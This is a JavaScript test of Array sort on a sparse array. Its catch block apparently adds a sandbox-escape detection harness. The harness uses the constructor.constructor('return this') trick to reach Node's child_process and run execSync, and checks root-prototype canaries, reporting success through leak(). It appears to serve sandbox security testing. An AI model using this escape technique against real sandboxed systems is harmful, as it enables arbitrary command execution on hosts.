try {
    var array = [
        'a',
        ,
        void 0
    ];
    if (array.length !== 3) {
        $ERROR('#1: array.length !== 3. Actual: ' + array.length);
    }
    if (array.hasOwnProperty('0') !== true) {
        $ERROR('#2: array.hasOwnProperty(\'0\'). Actual: ' + array.hasOwnProperty('0'));
    }
    if (array.hasOwnProperty('1') !== false) {
        $ERROR('#3: array.hasOwnProperty(\'1\'). Actual: ' + array.hasOwnProperty('1'));
    }
    if (array.hasOwnProperty('2') !== true) {
        $ERROR('#4: array.hasOwnProperty(\'2\'). Actual: ' + array.hasOwnProperty('2'));
    }
    array.sort();
    if (array.length !== 3) {
        $ERROR('#5: array.length !== 3. Actual: ' + array.length);
    }
    if (array.hasOwnProperty('0') !== true) {
        $ERROR('#6: array.hasOwnProperty(\'0\'). Actual: ' + array.hasOwnProperty('0'));
    }
    if (array.hasOwnProperty('1') !== true) {
        $ERROR('#7: array.hasOwnProperty(\'1\'). Actual: ' + array.hasOwnProperty('1'));
    }
    if (array.hasOwnProperty('2') !== false) {
        $ERROR('#8: array.hasOwnProperty(\'2\'). Actual: ' + array.hasOwnProperty('2'));
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}